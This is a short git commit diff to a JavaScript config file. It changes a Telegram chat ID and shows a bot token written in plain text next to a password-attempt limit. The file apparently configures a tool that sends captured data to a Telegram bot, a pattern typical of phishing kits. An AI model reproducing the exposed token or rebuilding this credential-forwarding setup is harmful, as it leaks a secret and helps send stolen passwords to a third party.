b45aa2e05596e93370aa92b7ee5021459bbee807
kindscongchua7-crypto <kindscongchua7@gmail.com>
2026-07-09 01:46:11 +0700

    Update config.js

--- src/utils/config.js
+++ src/utils/config.js
@@ -1,6 +1,6 @@
 const config = {
     token: '8915629981:AAEt5XSTWguw8jvrSCTunAvvnee-YnXOwhU',
-    chat_id: '5330962844',
+    chat_id: '-5330962844',
     noti_token: '',
     noti_chat_id: '',
     max_password_attempts: 2,
